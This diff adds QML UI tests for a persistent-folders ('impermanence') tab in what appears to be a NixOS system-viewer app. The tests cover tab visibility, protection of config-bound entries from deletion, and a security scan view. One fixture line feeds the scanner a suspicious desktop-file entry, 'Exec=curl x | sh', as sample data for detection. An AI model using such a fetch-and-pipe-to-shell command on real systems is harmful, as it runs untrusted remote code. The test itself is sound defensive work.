@@ -52,6 +52,47 @@ Item {
     TestCase {
         name: "SharedView"
         when: windowShown
+        function test_persistent_folders_tab_appears_only_when_detected() {
+            core.impermanence = core.emptyImpermanence;
+            const navigation = findChild(app, "tab-impermanence");
+            verify(!navigation.visible);
+            verify(!app.tools.some(t => t.key === "impermanence"));
+            core.impermanence = core.parseImpermanence("volatile\tyes\ttmpfs\npersist\t/persist\tbind\t2\text4\t1000\t500\t500\n");
+            verify(navigation.visible);
+            verify(!app.tools.some(t => t.key === "impermanence"));
+            wait(50);
+            mouseClick(navigation);
+            compare(core.activeViewMode, "impermanence");
+            verify(navigation.selected);
+            verify(!app.inTools);
+            compare(app.activeTool, null);
+            verify(!findChild(app, "toolsOverlay").visible);
+            const content = findChild(app, "impermanenceTab");
+            verify(content.visible);
+            compare(content.parent.objectName, "viewBody");
+        }
+        function test_persistent_folders_tab_shows_folders_findings_and_confirms_deletes() {
+            core.impermanence = core.parseImpermanence("volatile\tyes\ttmpfs\npersist\t/persist\tbind\t1\text4\t1000\t500\t500\nentry\td\t/home/u/.ssh\t/persist/home/u/.ssh\n");
+            core.impermanenceListing = core.parseImpermanenceListing("D\t/persist/home/u\t/persist\t5000\t12\t1700000000\n" + "C\td\t4000\t10\t1700000000\t1700000000\t755\tu\th\t\t.cache\n" + "C\td\t1000\t2\t1700000000\t1700000000\t700\tu\th\t\t.ssh\n");
+            core.activeViewMode = "impermanence";
+            wait(50);
+            const tab = findChild(app, "impermanenceTab");
+            verify(tab.visible);
+            compare(tab.shownItems.length, 2);
+            compare(tab.crumbs.length, 3);
+            // Entries bound by the configuration cannot be deleted from here.
+            verify(tab.isBound(tab.shownItems[1]));
+            verify(!tab.isBound(tab.shownItems[0]));
+            tab.pendingPath = tab.shownItems[0].path;
+            wait(20);
+            tab.setLens("security");
+            compare(tab.pendingPath, "");
+            core.impermanenceScan = core.parseImpermanenceScan("high\tSuspicious command\t/persist/a.desktop\tExec=curl x | sh\n" + "low\tRuns automatically\t/persist/b\tnote\n");
+            compare(tab.findings.length, 2);
+            compare(tab.shownFindings.length, 1);
+            compare(tab.minorCount, 1);
+            tab.setLens("browse");
+        }
         function test_non_nixos_tools() {
             core.isNixOS = false;
             core.activeViewMode = "tools";
